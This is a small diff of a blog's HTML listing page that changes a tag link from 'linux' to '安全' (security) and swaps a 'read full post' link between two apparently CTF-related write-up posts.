-            <a href="/tags/linux/" style="color: #ff7d73">linux</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
         </span>
         
     </div>
-    <a href="/2023/05/22/2023%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
+    <a href="/2023/06/02/NSS%E5%91%A8%E5%B8%B8%E5%88%B7%E5%AF%86%E7%A0%81(2)/" class="go-post">阅读全文</a>
 </div>
 
 
